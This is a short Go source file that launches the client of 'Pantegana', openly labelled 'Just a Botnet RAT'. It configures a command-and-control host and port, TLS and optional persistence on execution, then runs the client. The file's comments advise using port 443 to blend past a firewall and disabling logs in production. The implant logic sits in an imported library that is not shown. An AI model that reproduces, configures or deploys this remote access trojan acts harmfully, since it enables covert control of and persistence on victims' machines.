package main

import (
	client "github.com/cassanof/pantegana/client"
)

func main() {

	cfg := client.ClientConfig{
		Name:        "Pantegana",         // Used for persistence
		DisplayName: "Just a Botnet RAT", // Used for persistence
		Host:        "127.0.0.1",
		Port:        1337,  // change this to 443 if you want to blend into a firewall.
		HasTLS:      true,  // disable for debug only
		HasLogs:     true,  // disable this in production
		AutoPersist: false, // enable for persistance on execution
	}

	client.RunClient(&cfg)
}
